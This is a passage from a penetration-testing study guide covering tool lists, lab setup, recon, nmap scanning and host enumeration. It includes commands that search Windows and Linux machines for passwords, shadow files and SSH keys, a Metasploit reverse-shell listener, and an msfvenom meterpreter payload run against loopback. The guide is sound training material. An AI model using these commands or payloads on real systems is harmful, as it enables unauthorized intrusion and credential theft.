WinDBG (https://docs.microsoft.com/en-us/windows-
hardware/drivers/debugger/debugger-download-tools) 
• 
IDA (https://www.hex-rays.com/products/ida/support/download_freeware/) 
Penetration Testing 
PUBLIC – Version 0.3 
Copyright Xservus Limited 
Page 17 
Software Assurance Tools 
• 
FindBugs (http://findbugs.sourceforge.net/) 
• 
FindSecBugs (https://find-sec-bugs.github.io/) 
• 
Peach (http://community.peachfuzzer.com/WhatIsPeach.html) 
• 
AFL (American Fuzzy Lop) (https://github.com/google/AFL) 
• 
SonarQube (https://www.sonarqube.org/downloads/) 
• 
YASCA (https://sourceforge.net/projects/yasca/) 
Wireless Testing 
• 
Aircrack-ng (https://www.aircrack-ng.org/downloads.html) 
• 
Kismet (https://www.kismetwireless.net/downloads/) 
• 
WiFite (https://github.com/derv82/wifite2) 
• 
WiFi-Pumpkin (https://github.com/P0cL4bs/WiFi-Pumpkin-deprecated) 
Web Proxy Tools 
• 
OWASP ZAP (https://www.zaproxy.org/download/) 
• 
BURP Suite (https://portswigger.net/burp/communitydownload) 
Social Engineering Tools 
• 
Social Engineering Toolkit (https://github.com/trustedsec/social-engineer-toolkit) 
• 
BeEF (Browser Exploitation Framework) (https://github.com/beefproject/beef) 
Remote Access Tools 
• 
SSH 
• 
Ncat (https://nmap.org/ncat/) 
• 
Netcat 
• 
Proxychains (https://github.com/haad/proxychains) 
Network Tools 
• 
Wireshark (https://www.wireshark.org/download.html) 
• 
Hping (https://github.com/antirez/hping) 
Mobile Tools 
• 
Drozer (https://github.com/FSecureLABS/drozer) 
• 
APKX (https://github.com/b-mueller/apkx) 
• 
APK Studio (https://github.com/vaibhavpandeyvpz/apkstudio/releases) 
Misc Tools 
• 
Powersploit (https://github.com/PowerShellMafia/PowerSploit) 
• 
Searchsploit (https://www.exploit-db.com/searchsploit) 
• 
Responder (https://github.com/SpiderLabs/Responder) 
• 
Impacket (https://github.com/SecureAuthCorp/impacket) 
• 
Empire (C2) (https://github.com/EmpireProject/Empire) 
• 
Metasploit (https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers) 
Penetration Testing 
PUBLIC – Version 0.3 
Copyright Xservus Limited 
Page 18 
Lab Environment 
Dependencies 
• 
An internet connection 
• 
A Host System that supports running a type 2 hypervisor or Cloud IaaS provider 
o Enough CPU resources 
o 16GB RAM 
o 1TB Storage 
• 
A type-2 hypervisor such as: 
o Oracle Virtual Box 
o Hyper-V 
o VMWare Workstation 
o VMWare Fusion 
Guest Operating Systems 
• 
Kali Linux 
• 
Black Arch 
• 
Parrot OS 
• 
Windows 7 Pro Eval 
• 
Windows 10 Enterprise Eval 
• 
Windows Server 2016 Eval 
• 
Windows Server 2019 Eval 
Getting ISOs etc. isn’t always simple however you can use tools such as RUFUS: 
https://rufus.ie/ 
from the vendor sites or using this tool: 
https://www.heidoc.net/joomla/technology-science/microsoft/67-microsoft-windows-and-office-
iso-download-tool 
Vulnerable Pre-Made Targets 
Multipliable (https://information.rapid7.com/metasploitable-download.html) 
OWAS-BWA (https://sourceforge.net/projects/owaspbwa/) 
Extras For learning 
OWAS JUICE SHOP (https://owasp.org/www-project-juice-shop/) 
DVWA (http://www.dvwa.co.uk/) 
• 
Hack the Box (https://www.hackthebox.eu/) 
• 
TryHackMe (https://tryhackme.com/) 
• 
VulnHub (https://www.vulnhub.com/) 
Penetration Testing 
PUBLIC – Version 0.3 
Copyright Xservus Limited 
Page 19 
Penetration Testing Standards and 
Frameworks 
Types of Penetration Test 
• 
Objective Based 
• 
Target Based 
• 
Compliance Based 
Frameworks 
• 
OSSTMM 
• 
PTES 
• 
OWASP ASV 
• 
CHECK 
• 
ISSAF 
• 
NIST 
Resources 
http://www.pentest-standard.org/index.php/Main_Page 
https://www.ncsc.gov.uk/information/check-penetration-testing 
https://owasp.org/www-project-application-security-verification-standard/ 
https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-115.pdf 
https://www.isecom.org/research.html 
Penetration Testing 
PUBLIC – Version 0.3 
Copyright Xservus Limited 
Page 20 
Penetration Testing Phases 
Project 
Scoping, Project Setup, Legal & Regulatory, Scheduling, Rules of Engagement 
It’s not all pew pew bang bang, there is a lot to be considered, planned, agreed and scheduled. 
Penetration Testing Phases 
Post Exploitation 
Report Creation and Delivery 
Key Stakeholder and Team Playback 
This is (in my opinion) an undervalued activity area but also one that does not receive the attention 
it deserves. This part is the key element to a security assurance testing project, a lot of people 
consider the report to be the outcome of a pen test, and from a standard point of view that might be 
the case, however what I’ve know  is that unless you are simply ticking a box, they key value is 
ensuring the  recipient of the test understands not only what the findings mean tot them in terms of 
business risk, likelihood, confidence and impact but also how to  develop remedial or mitigation 
strategies (this includes advising on how to avoid creation of the vulnerabilities in the first place). 
It’s important not only to ensure the recipients understand the findings but also ensure that 
additional business contextualisation occurs, not every finding will be acted upon and sometimes 
that for a very valid business reason (other times you may need to really outline what the potential 
impacts may be). Either way, communication is key! Remember the objective is to improve the 
security posture through identification of weaknesses. 
Passive 
Recon
Active Recon
Vulnerability 
Assessment
Penetration
Exploitation
Post 
Exploitation
Penetration Testing 
PUBLIC – Version 0.3 
Copyright Xservus Limited 
Page 21 
Pentest – Recon 
Our goal here is to understand as much about the target as possible both from a passive perspective 
and an active perspective. 
Tool bag 
• 
Whois 
• 
Nslookup 
• 
FOCA (https://github.com/ElevenPaths/FOCA) 
• 
Maltego (https://www.maltego.com/) 
• 
TheHarvester (https://github.com/laramies/theHarvester) 
• 
Shodan (https://www.shodan.io/) 
• 
Recon-ng (https://github.com/lanmaster53/recon-ng) 
You are also going to want to use several services such as: 
• 
Public facing websites 
• 
GitHub Repositories 
• 
Social Media Sites 
• 
Search Engines 
• 
News Sites/Press Releases 
• 
Job Descriptions/Job Adverts 
We are also going to want to use other tools such as: 
The Internet Archive WayBack machine: 
https://archive.org/web/ 
Recon Types and Focuses 
With regards to penetration testing there are 2 types of recon: 
1. Passive Recon 
2. Active Recon 
Penetration Testing 
PUBLIC – Version 0.3 
Copyright Xservus Limited 
Page 22 
Passive Recon 
During passive recon we don’t directly touch the target environment. Instead we leverage alterative 
data sources to enumerate information about the target organisation and scope. 
Search Engines 
Example – Google Dorking 
Before we hit some of the syntax there’s a cool db and loads of web resources on this topic: 
https://www.exploit-db.com/google-hacking-database 
Types 
• 
site: 
• 
filetype: 
• 
inurl: 
• 
intitle: 
Operators 
• 
OR 
• 
AND 
Example 
DNS 
We can search dns using a tool as simple as “nslookup” 
Other tools exist such as: 
• 
Dig (Domain Information Groper) 
• 
DNSRecon (https://tools.kali.org/information-gathering/dnsrecon) 
Maltego 
Maltego comes in a variety of shapes and sizes, Community, Classica, XL etc. 
Penetration Testing 
PUBLIC – Version 0.3 
Copyright Xservus Limited 
Page 23 
https://www.maltego.com/ 
Maltego is a great tool at collecting, collating, creating and visualising data using graphs for open 
source intelligence gathering and analysis. 
Spiderfoot 
Spiderfoot isn’t included in PenTest+ to my knowledge but it should be! There’s both an open source 
version of spider foot but also a hosted commercial version called Spiderfoot-HX 
Shodan 
Shodan is a search engine for systems, devices and services. 
https://www.shodan.io 
Recon-NG 
Recon-NG is a great tool that also integrates into a large range of tools via API keys. 
The Harvester 
Documenting Findings 
Once you have gathered intelligence on you target you need to filter it and ensure the data you are 
creating is supportive of your objectives. 
You are trying to find intel that helps: 
• 
User lists/Email Lists 
• 
Organisation Data 
• 
Organisation Structure 
• 
Suppliers 
• 
Remote Access Services 
• 
Physical Locations 
• 
Network and DNS information 
• 
Products and Services 
Penetration Testing 
PUBLIC – Version 0.3 
Copyright Xservus Limited 
Page 24 
Active Recon 
Here our systems connect to the target services. 
Network Scanning 
• 
Nmap 
• 
Nikto 
• 
Metasploit 
Nmap (Network Mapper) 
Nmap basic scan scans the most common TOP 1000 ports (not the first 1-1000 ports) 
Common scan types 
• 
Connect Scan (Full Scan) – This does a 3-way handshake 
• 
SYN Scan (Half Open) – This does the first step of the handshake sending SYN, gets a SYN-
ACK and then never completes the conversation 
• 
Tracert (Conducts a traceroute) 
• 
Ping (uses ICMP protocol to echo the target) 
• 
UDP Scan (super-fast UDP scan =”nmap -sU --defeat-icmp-ratelimit” required nmap 7.4) 
• 
NULL Scan (TCP Packets with no FLAGS set) 
• 
FIN Scan 
A common scan people use: 
nmap -vvv -O -sV -sC -sS -T4 -oA results 192.168.1.1 
This scan will be verbose (x3), will detect operating system version (-O), Service Vesions (-sV) 
Scanning ranges 
Nmap {Scan Options} 192.168.1.0/25 
-sn = ping sweep 
-PR = arp scan 
-PA = Non existent TCP Connections 
XMAS Tree Scan 
-sX 
OS Identification Through TTL 
Different OS’s respond to ICMP echo with different TTLS 
https://subinsb.com/default-device-ttl-values/ 
There’s load there but you just need to know the common ones like: 
• 
Common Windows Versions 
• 
Linux Versions 
OS 
TTL 
Linux/Unix 
64 
Windos 
128 
Penetration Testing 
PUBLIC – Version 0.3 
Copyright Xservus Limited 
Page 25 
Solaris/AIX 
254 
Packet Crafting 
Creation of bespoke packets (hping, hping3 etc.) 
• 
Create 
• 
Edit 
• 
Play 
• 
Decode 
Network Mapping Tools 
• 
ZenMAP 
• 
SpiceWorks 
• 
WhatsUPGOld 
• 
TheDUDE 
• 
Nagios 
• 
SolarWinds 
Mapping the Network with Metasploit 
• 
Metasploit Framework 
• 
Community 
• 
Express 
• 
Pro 
Now using Metasploit is fairly simple but it’s far too in depth for here! 
Armitage 
Included with KALI but no longer in development 
Penetration Testing 
PUBLIC – Version 0.3 
Copyright Xservus Limited 
Page 26 
Cobalt Strike 
A commercial offering created by the author of Armitage 
Other C2 Servers 
• 
Empire 
• 
Coventant 
Enumerations Basics 
Banner Grabbing 
We can grab banners using tools such as telnet, nc, nmap etc. 
To enumerate a banner with nmap we use -sV 
We can also enumerate banners and service information manually using tools like telnet, netcat/nc 
etc. 
Telnet 
SMB 
SMTP 
• 
SMTP Port is 25 
• 
Encrypted SMTP uses port 587 
• 
VRFY is used to check a mailbox 
• 
EXPN is used to check a group 
FTP 
FTP Attacks include BOUNCE. A BOUNCE attack uses one FTP server to MiTM another FTP Server. 
On box enumerations 
Using tools interactively / from an authenticated point of view such as: 
Netstat (Windows and Unix Based Systems) 
Penetration Testing 
PUBLIC – Version 0.3 
Copyright Xservus Limited 
Page 27 
Penetration Testing 
PUBLIC – Version 0.3 
Copyright Xservus Limited 
Page 28 
Basic Local Windows Enumeration 
Command Execution (using cmd.exe shell) 
Dir 
Cd 
hostname 
Whoami 
Whoami /privs 
echo %path% 
Ipconfig /all 
Route print 
Arp -a 
Net use 
Systeminfo 
Net Start 
Net users 
Net localgroup 
Net user administrator 
Net localgroup administrators 
Net localgroup ‘remote management users’ 
Net localgroup ‘remote desktop users’ 
Net localgroup ‘Backup Operators’ 
Net localgroup administrators 
netstat -ano 
netsh firewall show state 
schtasks /query /fo LIST /v 
tasklist /SVC 
Driverquery 
wmic qfe get Caption,Description,HotFixID,InstalledOn 
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated 
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated 
dir /s *pass* == *cred* == *vnc* == *.config* ==*.txt* 
findstr /si password *.xml *.ini *.txt *.config *.xlsx *.docx 
reg query HKCU /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
wmic process list brief | find "winlogon" 
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v 
"c:\windows\\" |findstr /i /v """ 
Clearing Up Output (cmd.exe) 
| #pipe output 
>  #output to file (overwrite) 
>> #output to file (append) 
| findstr #find a string in the output 
PowerShell (using PowerShell) 
Get-Command #show all commands 
Get-LocalGroup 
Get-LocalGroupMember administrators 
Get-ChildItem -Path c:\ -Include *.docx,*.doc,*.xlsx,*.xls,*.config,*.ini -file -recurse -erroraction 
silentlycontinue | select-string password 
Get-Hotfix 
Penetration Testing 
PUBLIC – Version 0.3 
Copyright Xservus Limited 
Page 29 
Basic Linux Enumeration 
There are a ton of tools you can use from Enum4Linux, the Metasploit modules, smbclient, ftp, 
grep.. honestly there’s a lot so lets’ look at some common tools: 
• 
Enum4Linux 
• 
Impacket 
• 
Metasploit 
• 
Nmap (we won’t cover that again) 
Enum4Linux -a -u administrator -p Pa55w0rd1 192.168.1.1 
Metasploit 
There are hundreds of moudles 
Using Metasploit to hunt for SMB shares on a range (change the CIDR range on RHOSTS to suit) 
msfconsole 
search smb_enumshares 
use auxiliary/scanner/smb/smb_enumshares 
info 
options 
set RHOSTS 192.168.1.0/24 
run 
Cool msf commands 
setg #setglobal – makes the option stick between modules e.g. setg LHOST 192.168.1.10 
set verbose true # enables verbose output 
#RUN A LISTENER from the CLI on one line 
msfconsole -x "use exploit/multi/handler;set PAYLOAD windows/meterpreter/reverse_tcp;set 
LHOST 0.0.0.0;set ExitOnSession False;run" 
Penetration Testing 
PUBLIC – Version 0.3 
Copyright Xservus Limited 
Page 30 
On Box Enumeration (Linux) 
BASH (Basic Enumeration) 
whoami 
whoami 
ifconfig 
ip a 
arp 
uname -a 
route 
netstat -antp 
netstat -anup 
mount 
df -a 
dpkg -l 
ps 
ps aux 
ps aux | grep root 
ps -ef | grep root 
ps -ef 
cat /etc/services 
cat /etc/passwd 
cat /etc/shadow 
apache2 -v 
mysql --version 
cat /etc/groups 
cat /etc/resolv.conf 
nmap –version 
find / -name nc 2>/dev/null 
crontab -l 
grep -i password /etc/my.ini 
cat /etc/sudoers 
cat ~/.bash_history 
cat ~/.ssh/id_rsa 
find / -perm -u=s -type f 2>/dev/null 
find / -perm -g=s -type f 2>/dev/null 
METASPLOIT (Basic Enumeration) 
Modules 
Post Modules require a SESSION to be established: 
linux_enum_system 
linux_enum_cofigs 
linux_enum_network 
linux_protections 
linux_enum_user_history 
Local Shell Test 
The following test just let’s you connect to youself on your loopback address on TCP port 9999 
Penetration Testing 
PUBLIC – Version 0.3 
Copyright Xservus Limited 
Page 31 
Metasploit Console 
use exploit/multi/handler 
set PAYLOAD linux/x64/meterpreter/reverse_tcp 
set LPORT 9999 
set LHOST 0.0.0.0 
set ExitOnSession FALSE 
run -j 
Local Linux Machine (x64 Architecture) 
#Create a Payload 
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=9999 -f elf > shell.elf 
#set as executeable 
chmod +x shell.elf 
#run the payload 
./shell.elf 
You should see a local connection 
Penetration Testing 
PUBLIC – Version 0.3 
Copyright Xservus Limited 
Page 32 
We are now in a position where we can run POST modules: 
use post/linux/gather/enum_system 
set SESSION 2 #change the ID to match your session number – check sessions -l 
run 
NULL SESSIONS 
SMB Prior to Server 2003 on Windows machines but also older versions of SAMBA also have this 
vulnerability. 
To enumerate this, we can simply use: 
Net use \\target\ipc$ /U: "" "" 
Net view \\target 
Penetration Testing 
PUBLIC – Version 0.3 
Copyright Xservus Limited 
Page 33 
WebServer Enumeration 
HTTP Response codes 
• 
HTTP 401 
• 
HTTP 403 
• 
HTTP 404 
• 
HTTP 200 
• 
HTTP 402 
These can be enumerated using a browser and developers’ mode, a web proxy tool like BURP, 
FIDDLER or OWAS ZAP or using tools like nmap etc. 
nmap --script=http-enum 192.168.1.1 
nmap --script=http-php-version 192.168.1.1 
nmap --script=http-wordpress-enum 192.168.1.1 
Vulnerability Scanning 